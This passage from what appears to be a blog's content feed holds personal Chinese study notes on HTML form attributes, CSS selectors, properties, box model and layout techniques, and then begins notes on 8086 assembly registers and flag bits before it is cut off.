class="line">method=&quot;value&quot;</span><br></pre></td></tr></table></figure><h4 id="3-6-表单元素"><a href="#3-6-表单元素" class="headerlink" title="3.6 表单元素"></a>3.6 表单元素</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*元素类型*/</span></span><br><span class="line">type=&quot;value&quot;</span><br><span class="line"><span class="comment">/*value：</span></span><br><span class="line"><span class="comment">text（文本框），password（密码框），radio（单选框），checkbox（复选框），file（文件），hidden（隐藏域），botton（普通按钮），submit（提交按钮），reset（重置按钮），date（日期框）</span></span><br><span class="line"><span class="comment">radio（单选框），checkbox（复选框）：用name选定组</span></span><br><span class="line"><span class="comment">hidden（隐藏域）：看不见，但是可提交数据*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*元素默认值*/</span></span><br><span class="line">value=&quot;value&quot;</span><br><span class="line"><span class="comment">/*最大长度：*/</span></span><br><span class="line">maxlength=&quot;num&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*聚焦对象。id填聚焦对象的id*/</span></span><br><span class="line">for=&quot;id&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*可多选*/</span></span><br><span class="line">multiple=&quot;multiple&quot;</span><br><span class="line"><span class="comment">/*禁止提交*/</span></span><br><span class="line">disabled=&quot;disabled&quot;</span><br><span class="line"><span class="comment">/*只读：*/</span></span><br><span class="line">readonly=&quot;readonly&quot;</span><br><span class="line"><span class="comment">/*默认选中项*/</span></span><br><span class="line">selected=&quot;selected&quot;</span><br></pre></td></tr></table></figure><h4 id="3-7-字符实体"><a href="#3-7-字符实体" class="headerlink" title="3.7 字符实体"></a>3.7 字符实体</h4><ul><li>普通字符<ul><li>&lt;：<code>&amp;lt;</code></li><li>>：<code>&amp;gt;</code></li><li>空格：<code>&amp;nbsp;</code></li><li>版权：<code>&amp;copy;</code></li></ul></li></ul><hr><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><blockquote><p><a href="https://www.w3school.com.cn/css/index.asp">CSS教程</a></p></blockquote><hr><h2 id="一、基础-1"><a href="#一、基础-1" class="headerlink" title="一、基础"></a>一、基础</h2><h3 id="1-基本语法"><a href="#1-基本语法" class="headerlink" title="1 基本语法"></a>1 基本语法</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*选择器名 &#123; 属性 : 属性值 ; ... &#125;*/</span></span><br><span class="line"><span class="selector-tag">div</span> &#123; <span class="attribute">background-color</span> : red ; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* label.calss：标签下的类 */</span></span><br></pre></td></tr></table></figure><ul><li>1、css声明要以分号结尾，声明要用{}括起。</li><li>2、一行写一个声明。</li><li>3、如果属性值是多单词组成，要加上引号。</li></ul><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2 基本使用"></a>2 基本使用</h3><blockquote><p><a href="https://www.cnblogs.com/my--sunshine/p/6872224.html">link和import区别</a></p></blockquote><ol><li><p>行内式：定义在标签中</p><p><code>&lt;p style=&quot; ... &quot; &gt;&lt;/p&gt;</code></p></li><li><p>嵌入式</p><blockquote><p>开辟一段属于css的代码，通常在<head>中嵌套，之后再在body中使用该标签会有对应的属性</head></p></blockquote><p><code>&lt;style type=&quot;text/css&quot;&gt; p&#123;color:blue;font-size:40px;&#125; &lt;/style&gt;</code></p></li><li><p>引入外联样式文件</p><blockquote><p>先定义好再直接引用。</p><p>新建css文件——选择器，例：p {color:red;}</p><p>rel：当前文件与引入的文件之间的关系。</p></blockquote><p><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/*.css（路径）&quot; /&gt;</code></p></li></ol><ul><li><strong>优先级：</strong>样式代码距离应用代码的距离，越近越先执行。</li></ul><hr><h2 id="二、选择器"><a href="#二、选择器" class="headerlink" title="二、选择器"></a>二、选择器</h2><h3 id="1-基本选择器"><a href="#1-基本选择器" class="headerlink" title="1 基本选择器"></a>1 基本选择器</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*通用选择器*/</span></span><br><span class="line">* &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*元素选择器*/</span></span><br><span class="line"><span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*id选择器*/</span></span><br><span class="line"><span class="selector-id">#id</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*类选择器*/</span></span><br><span class="line"><span class="selector-class">.class</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*组合选择器（或运算）*/</span></span><br><span class="line">selector1,selector2, ... &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*title*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title ]</span> ... &#123;&#125; <span class="comment">/*有title的标签*/</span></span><br><span class="line">lable<span class="selector-attr">[ title=value ]</span> <span class="comment">/*具体值匹配（标签中加上 title 属性）*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title ^= t ]</span> <span class="comment">/*以 t 开头的 title*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-attr">[ title $= 0]</span> <span class="comment">/*以 0 结尾的 title*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*优先级（权重）：!important(max) &gt; style(1000)&gt; id(100) &gt; class(10) &gt; label(1) &gt; * */</span></span><br><span class="line"><span class="comment">/*!important要写在分号前,优先级最高*/</span></span><br><span class="line"><span class="selector-tag">p</span>&#123;<span class="attribute">color</span>:red<span class="meta">!important</span>; &#125;      </span><br></pre></td></tr></table></figure><h3 id="2-组合选择器"><a href="#2-组合选择器" class="headerlink" title="2 组合选择器"></a>2 组合选择器</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*后代选择器（派生选择器）：选择指定元素的所有后代元素（空格分割）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span>   selector2/<span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*子代选择器：选择指定元素的第一代元素*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> &gt; selector2/<span class="selector-tag">label</span> &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*相邻兄弟选择器：选择指定元素的相邻的下一个元素（只向下找紧连一个）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> + selector2/<span class="selector-tag">label</span>  &#123; name:value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*普通兄弟选择器：选择指定元素后的指定同级元素（只会向下找）*/</span></span><br><span class="line">selector1/<span class="selector-tag">label</span> ~ selector2/<span class="selector-tag">label</span>  &#123; name:value; &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="三、常用属性"><a href="#三、常用属性" class="headerlink" title="三、常用属性"></a>三、常用属性</h2><h3 id="1-伪类"><a href="#1-伪类" class="headerlink" title="1 伪类"></a>1 伪类</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*得到焦点的控件的样式*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">:focus</span> &#123;&#125;</span><br><span class="line"><span class="comment">/*鼠标悬停的控件的样式*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">:hover</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本前 / 后加文本*/</span></span><br><span class="line"><span class="selector-tag">label</span><span class="selector-pseudo">::before</span> / after &#123; <span class="attribute">content</span>: <span class="string">&quot;str&quot;</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="2-background"><a href="#2-background" class="headerlink" title="2 background"></a>2 background</h3><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/gradient/linear-gradient">渐变色：linear-gradient()</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*背景颜色。value：color，transparent（透明的），rgba(0,0,0,0)*/</span></span><br><span class="line"><span class="attribute">background-color</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片 （默认重复显示）*/</span></span><br><span class="line"><span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string"> url </span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片重复。value：no-repeat;repeat-x;repeat-y;repeat;*/</span></span><br><span class="line"><span class="attribute">background-repeat</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片大小。size：lengthpx widthpx*/</span></span><br><span class="line"><span class="attribute">background-size</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片滚动。balue：Scroll，Fixed(背景固定)*/</span></span><br><span class="line"><span class="attribute">background-attachment</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*背景图片初始位置。value：n%、num、top、left、right、bottom、center*/</span></span><br><span class="line"><span class="attribute">background-position</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合集（可填之前所有属性值）*/</span></span><br><span class="line"><span class="attribute">background</span>:value;</span><br></pre></td></tr></table></figure><h3 id="3-text"><a href="#3-text" class="headerlink" title="3 text"></a>3 text</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*文本颜色。value：同 html 的 text，两字符相同可缩写，例：# ff0000 = #f00*/</span></span><br><span class="line"><span class="attribute">color</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本首行缩进。value：num em;（1em：1字符）*/</span></span><br><span class="line"><span class="attribute">text-indent</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本对齐*/</span></span><br><span class="line"><span class="attribute">text-align</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单词间距（分词，仅英文）*/</span></span><br><span class="line"><span class="attribute">word-spacing</span>:size;</span><br><span class="line"><span class="comment">/*字母间距（分字，中英皆可）*/</span></span><br><span class="line"><span class="attribute">letter-spacing</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本装饰。value：overline;underline;line-through;none;blink;（设置多值中间用空格隔开）*/</span></span><br><span class="line"><span class="attribute">text-decoration</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*设置行高（可以用来垂直居中）*/</span></span><br><span class="line"><span class="attribute">line-height</span>:size;</span><br><span class="line"><span class="comment">/*垂直对齐。value：baseline、top、bottom、middle*/</span></span><br><span class="line"><span class="attribute">vertical-align</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文本阴影 offset-x | offset-y | blur-radius | color */</span></span><br><span class="line"><span class="attribute">text-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="comment">/*盒子阴影 x 偏移量 | y 偏移量 | 阴影模糊半径 | 阴影颜色 */</span></span><br><span class="line"><span class="attribute">box-shadow</span>:<span class="number">2px</span> <span class="number">2px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>);</span><br></pre></td></tr></table></figure><h3 id="4-font"><a href="#4-font" class="headerlink" title="4 font"></a>4 font</h3><blockquote><p><a href="https://fontawesome.com/">official::Font Awesome</a></p><p><a href="https://www.iconfont.cn/">阿里巴巴图标库</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*字体效果（字体尽量用图片显示）*/</span></span><br><span class="line"><span class="attribute">font-family</span>:value;</span><br><span class="line"><span class="comment">/*value：带空格的单词应带上引号。多值中间用逗号隔开，当不识别第一个字体时会自动识别后续字体。*/</span></span><br><span class="line"><span class="comment">/*下载 icon*/</span></span><br><span class="line"><span class="keyword">@font-face</span>&#123; </span><br><span class="line">    <span class="attribute">font-family</span>:<span class="string">&#x27;iconfont&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;url&#x27;</span>); </span><br><span class="line">    format(&#x27;truetype&#x27;); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体大小*/</span></span><br><span class="line"><span class="attribute">font-size</span>:size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体风格.value：normal;italic（斜体）;oblique（强制倾斜）;*/</span></span><br><span class="line"><span class="attribute">font-style</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*字体粗细.value：100~900（越大越粗），bold（粗体，700），400（正常字体）*/</span></span><br><span class="line"><span class="attribute">font-weight</span>:value;</span><br></pre></td></tr></table></figure><h3 id="5-list"><a href="#5-list" class="headerlink" title="5 list"></a>5 list</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*表头图标（图标一般用此实现）*/</span></span><br><span class="line"><span class="attribute">list-style-image</span>:<span class="built_in">url</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*图标位置。value：inside，outside（图标在文本行内，外）*/</span></span><br><span class="line"><span class="attribute">list-style-position</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*图标类型。同 ul 的 type*/</span></span><br><span class="line"><span class="attribute">list-style-type</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合集*/</span></span><br><span class="line"><span class="attribute">list-style</span>:value;</span><br></pre></td></tr></table></figure><h3 id="6-display"><a href="#6-display" class="headerlink" title="6 display"></a>6 display</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*规定元素生成框的类型*/</span></span><br><span class="line"><span class="attribute">display</span>:value;</span><br><span class="line">block：元素会被显示，且元素会变成块级元素，元素前后会有换行符。</span><br><span class="line"><span class="attribute">none</span>：元素会被隐藏。（脱离文档流）</span><br><span class="line">inline：元素会显示为行内元素，元素前后没有换行符。</span><br><span class="line">inline-block：行内块级元素。</span><br><span class="line"></span><br><span class="line"><span class="comment">/*文档可见（不脱离文档流）*/</span></span><br><span class="line"><span class="attribute">visibility</span>:visable / hidden;</span><br></pre></td></tr></table></figure><h3 id="7-float"><a href="#7-float" class="headerlink" title="7 float"></a>7 float</h3><ol><li>只有横向浮动、没有纵向浮动。</li><li>会将元素的display属性变更为block。</li><li>浮动元素的后一个元素围绕着浮动元素。（典型运用是文字围绕图片）</li><li>浮动元素的前一个元素不会受到任何影响。（如何你想让两个块级元素并排显示，两个元素都应该有float属性）</li></ol><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*浮动，脱离文档流，多用于横向排列场景 value：none、left、right*/</span></span><br><span class="line"><span class="attribute">float</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*清除浮动（移动自己） value：left、right、both。*/</span></span><br><span class="line"><span class="attribute">clear</span>:value;</span><br></pre></td></tr></table></figure><hr><h2 id="四、盒子模型"><a href="#四、盒子模型" class="headerlink" title="四、盒子模型"></a>四、盒子模型</h2><h3 id="1-尺寸"><a href="#1-尺寸" class="headerlink" title="1 尺寸"></a>1 尺寸</h3><blockquote><p>W3C：宽高是蛋黄大小——content-box</p><p>Microsoft：宽高是蛋壳大小——border-box</p><p>默认W3C标准，修改：box-sizing : border-box ;</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*宽，最小宽，最大宽*/</span></span><br><span class="line"><span class="attribute">width</span>，<span class="attribute">min-width</span>，<span class="attribute">max-width</span>：</span><br><span class="line"><span class="comment">/*高，最小高，最大高*/</span></span><br><span class="line"><span class="attribute">height</span>，<span class="attribute">min-height</span>，<span class="attribute">max-height</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*溢出，x轴溢出，y轴溢出，文本溢出*/</span></span><br><span class="line"><span class="attribute">overflow</span> / <span class="attribute">overflow-x</span> / <span class="attribute">overflow-y</span> / <span class="attribute">text-overflow</span>:value; </span><br><span class="line"><span class="comment">/*value：visible（可见，默认），hidden（隐藏），scroll（滚动条），auto（必要时加滚动条），clip（裁剪），ellipsis（省略号）*/</span></span><br></pre></td></tr></table></figure><h3 id="2-定位"><a href="#2-定位" class="headerlink" title="2 定位"></a>2 定位</h3><blockquote><p><a href="https://www.w3school.com.cn/cssref/pr_class_position.asp">w3c定位</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">定位方式：<span class="attribute">position</span> : value ;</span><br><span class="line">（value：static（静态，默认），relative（相对），fixed（固定），absolute（绝对））</span><br><span class="line"></span><br><span class="line">位置：<span class="attribute">top</span>，<span class="attribute">right</span>，<span class="attribute">bottom</span>，<span class="attribute">left</span></span><br><span class="line"></span><br><span class="line">形状：<span class="attribute">clip</span> : rect (top, right, bottom, left) ;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*移动*/</span></span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(<span class="number">12px</span>, <span class="number">50%</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">2em</span>);</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translateY</span>(<span class="number">3in</span>);</span><br></pre></td></tr></table></figure><ul><li><p>relative</p><ol><li>定位点：原点。</li><li>不脱离文档流。</li></ol><blockquote><p>应用：</p><p>①一个容器中某个控件位置微调。</p><p>②配合 absolute 。</p></blockquote></li><li><p>absolute</p><ol><li><p>定位点：body，祖先是 relative 定位点则为祖先。</p></li><li><p>脱离文档流。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*absolute 堆叠顺序*/</span></span><br><span class="line"><span class="attribute">z-index</span>:value;</span><br><span class="line"><span class="comment">/*value：num（正数离用户近，负数离用户远。谁大谁在上面）*/</span></span><br></pre></td></tr></table></figure></li></ol></li></ul><h3 id="3-margin"><a href="#3-margin" class="headerlink" title="3 margin"></a>3 margin</h3><blockquote><p>外边距：边框到外部的距离。</p><p>可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左。</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置。value：auto（居中）*/</span></span><br><span class="line"><span class="attribute">margin</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单独设置*/</span></span><br><span class="line"><span class="attribute">margin-left</span></span><br><span class="line"><span class="attribute">margin-right</span></span><br><span class="line"><span class="attribute">margin-top</span></span><br><span class="line"><span class="attribute">margin-bottom</span></span><br></pre></td></tr></table></figure><h3 id="4-border"><a href="#4-border" class="headerlink" title="4 border"></a>4 border</h3><blockquote><p>边框：边框样式。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-radius">border-radius</a></p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置*/</span></span><br><span class="line"><span class="attribute">border</span>:width color style;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单个设置（可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左）*/</span></span><br><span class="line"><span class="attribute">border-top</span></span><br><span class="line"><span class="attribute">border-bottom</span></span><br><span class="line"><span class="attribute">border-left</span></span><br><span class="line"><span class="attribute">border-right</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*边框样式*/</span></span><br><span class="line"><span class="attribute">border-style</span>:value;</span><br><span class="line"><span class="comment">/*value：none（无边框），dotted（点线），dashed（虚线），solid（实线），double（双边框），groove（3D沟槽）， ridge（3D脊边框）， inset（3D嵌入），outset（3D突出）*/</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">border-color</span>:value;</span><br><span class="line"><span class="attribute">border-width</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*合并边框。value：collapse（合并），separate（默认，独立）*/</span></span><br><span class="line"><span class="attribute">border-collapse</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*圆角边框*/</span></span><br><span class="line"><span class="attribute">border-radius</span>:value;</span><br></pre></td></tr></table></figure><h3 id="5-outline"><a href="#5-outline" class="headerlink" title="5 outline"></a>5 outline</h3><blockquote><p>轮廓：和border很类似，但有如下区别：</p><ul><li>outline 不占据空间，绘制于元素内容周围。</li><li>根据规范，outline 通常是矩形，但也可以是非矩形的。</li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/outline">outline</a></p></blockquote><h3 id="6-padding"><a href="#6-padding" class="headerlink" title="6 padding"></a>6 padding</h3><blockquote><p>内边距：内容到边框的内距。</p><p>可设置多个元素，1：全部，2：上下 左右 3：上 左右 下 4：上 右 下 左。</p></blockquote><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*统一设置*/</span></span><br><span class="line"><span class="attribute">padding</span>:value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*单独设置*/</span></span><br><span class="line"><span class="attribute">padding-left</span></span><br><span class="line"><span class="attribute">padding-right</span></span><br><span class="line"><span class="attribute">padding-top</span></span><br><span class="line"><span class="attribute">padding-bottom</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、技巧"><a href="#五、技巧" class="headerlink" title="五、技巧"></a>五、技巧</h2><h3 id="1-清空默认"><a href="#1-清空默认" class="headerlink" title="1 清空默认"></a>1 清空默认</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*清空默认边距*/</span></span><br><span class="line"><span class="number">1</span>. *&#123; <span class="attribute">margin</span>: <span class="number">0</span>;<span class="attribute">padding</span>: <span class="number">0</span>; &#125;</span><br><span class="line"><span class="number">2</span>. reset<span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*清空超链接样式*/</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;<span class="attribute">text-decoration</span>: none;&#125; <span class="comment">/*普通*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;<span class="attribute">text-decoration</span>: none;&#125; <span class="comment">/*未访问*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">text-decoration</span>: none;&#125; <span class="comment">/*已访问*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;<span class="attribute">text-decoration</span>: none;&#125; <span class="comment">/*鼠标停留*/</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;<span class="attribute">text-decoration</span>: none;&#125; <span class="comment">/*正在点击*/</span></span><br></pre></td></tr></table></figure><h3 id="2-整体布局"><a href="#2-整体布局" class="headerlink" title="2 整体布局"></a>2 整体布局</h3><ul><li><p><strong>分块</strong></p><ul><li>一般可以将页面分成 12 列，盒子占位为 n 列。</li><li>width：设置最大为（width-20px）或（100%）（垂直滚动条占20px）</li><li>width：一般设置为一定大小（ 例：设置 960px ，页面为 1024px）</li></ul></li><li><p><strong>登录框恒居页面中</strong></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.login_page</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">560px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">480px</span>; <span class="comment">/*调节如下两个属性来改变位置*/</span></span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">280px</span>;</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>盒子布局</strong></p><blockquote><p>套盒子：盒子中套盒子便于后期加减内容和板块移动。（例：container 中套 content 和 img）</p></blockquote></li><li><p><strong>侧边栏和文本栏</strong></p><ul><li>侧边栏设置<ol><li>float : left ;</li><li>width : num px ;</li></ol></li><li>内容设置<ol><li>width : calc( 100% - num px ) ;</li><li>margin-left : num px ;</li></ol></li></ul></li></ul><h3 id="3-盒子内容"><a href="#3-盒子内容" class="headerlink" title="3 盒子内容"></a>3 盒子内容</h3><ul><li><p><strong>文本居中</strong></p><ul><li><p>横向居中</p><blockquote><p>text-align : center ;</p></blockquote></li><li><p>纵向居中</p><blockquote><p>line-height : num px;（设置后文本会自动居中）</p></blockquote></li></ul></li><li><p><strong>盒子居中</strong></p><blockquote><p>margin: 0 auto ; （自适应居中）</p></blockquote></li><li><p><strong>盒子重叠</strong></p><blockquote><p>盒子重叠要显示设置 color : rgba( , , , 0.5 ) 进行透明化。</p></blockquote></li><li><p><strong>撑起容器</strong></p><blockquote><p>容器中的盒子如果浮动会脱离容器。</p></blockquote><ol><li>尾部加一个盒子，然后 clear : left。</li><li>尾部加一个 p::after。</li><li>container { overflow : hidden ; }（缺点：有元素在容器之外将无法被显示）</li></ol></li><li><p><strong>图片盒子</strong></p><blockquote><p><hn></hn>：用 h1 等代替 <img> ，图片设置成背景，然后去掉h1 的文字。</p></blockquote><ol><li>font-size : 0px ;（可能会被浏览器忽略导致不解析）</li><li>text-indent : -9999px ;</li></ol></li></ul><h3 id="4-函数"><a href="#4-函数" class="headerlink" title="4 函数"></a>4 函数</h3><ul><li><p>calc( exp )</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*计算式*/</span></span><br><span class="line">calc(<span class="number">100%</span> - <span class="number">20px</span>)</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="网页其他操作"><a href="#网页其他操作" class="headerlink" title="网页其他操作"></a>网页其他操作</h1><ol><li><p>html 转 pdf</p><blockquote><p>页面——打印pdf</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> Html </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础汇编</title>
      <link href="/posts/a8fb0b6e.html"/>
      <url>/posts/a8fb0b6e.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><ul><li><p>基础</p><blockquote><p><a href=".\8d4b7ae1">text::计算机组成原理</a> </p></blockquote></li><li><p>注意事项</p><ul><li>小端模式：高地址高字节，低地址低字节</li><li>数据不能以字母开头，所以：0FFFFH</li><li>安全空间：0:200H - 0:2FFH</li></ul></li></ul><hr><h2 id="二、寄存器"><a href="#二、寄存器" class="headerlink" title="二、寄存器"></a>二、寄存器</h2><h3 id="1-普通寄存器"><a href="#1-普通寄存器" class="headerlink" title="1 普通寄存器"></a>1 普通寄存器</h3><ul><li><p>通用寄存器</p><blockquote><p>AX，BX，CX，DX（ 分高低位：AH，AL）</p></blockquote><ul><li>AX：累加寄存器。</li><li>BX：基址寄存器，用于内存寻址。（ <code>ds:[bx]</code> ）</li><li>CX：计数寄存器，用于 loop 循环。</li><li>DX：数据寄存器。</li></ul></li><li><p>段寄存器</p><blockquote><p>CS，DS，SS，ES（IP，SP）</p><p>特点：数据不能直接送入段寄存器，需要用寄存器送入段寄存器。</p></blockquote><ul><li><p>CS：代码段寄存器，IP：指令指针寄存器，<code>CS:IP(CS*10H + IP)</code>寻址。</p></li><li><p>DS：数据段寄存器，[p] 的地址寻址默认是 <code>DS:[ p ]</code>。</p></li><li><p>SS：堆栈段寄存器，SP：堆栈指针寄存器，<code>SS:SP</code>指向栈顶元素。</p><blockquote><p>SS被修改后下一条指令也会被执行。</p><p>所以</p><p>mov ss,ax</p><p>mov sp,10 </p><p>会一次性被执行</p></blockquote></li><li><p>ES：附加段寄存器。</p></li></ul></li><li><p>其他</p><ul><li>SI：源变址寄存器（无法分高低位）</li><li>DI：目的变址寄存器（无法分高低位）</li><li>BP：基址指针寄存器（ss:bp 指向内存）</li><li>PSW：标志寄存器（如下）</li></ul></li></ul><h3 id="2-标志寄存器位"><a href="#2-标志寄存器位" class="headerlink" title="2 标志寄存器位"></a>2 标志寄存器位</h3><div class="table-container"><table><thead><tr><th>15</th><th>14</th><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>/</td><td>/</td><td>/</td><td>/</td><td>OF</td><td>DF</td><td>IF</td><td>TF</td><td>SF</td><td>ZF</td><td>/</td><td>AF</td><td>/</td><td>PF</td><td>/</td><td>CF</td></tr></tbody></table></div><blockquote><p><a href="https://blog.csdn.net/liuzhaoze2000/article/details/111667011">原文</a></p><p>标志寄存器PSW是一个16为的寄存器。它反映了CPU运算的状态特征并且存放某些控制标志。8086使用了16位中的9位，包括6个状态标志位和3个控制标志位。</p></blockquote><ul><li><p>CF（Carry flag）</p><blockquote><p>进位标志位。无符号计算在最高位产生了进位或借位时，CF=1；反之，CF=0。</p><p>判断否是溢出的方法是：进行二进制运算时，最高位的进位与次高位的进位值进行异或运算若运算结果为1则表示溢出OF=1 ，否则OF=0。</p><p>三条原则:</p><ol><li>同号相加和异号相减才会发生溢出</li><li>同号相加结果的符号与参与运算的符号不同就溢出</li><li>异号相减结果的符号位与被减数的符号位不同就产生溢出</li></ol></blockquote></li><li><p>ZF（Zero flag）</p><blockquote><p>零标志位。当运算结果全零时，ZF=1；反之，ZF=0。</p></blockquote></li><li><p>SF（Sign 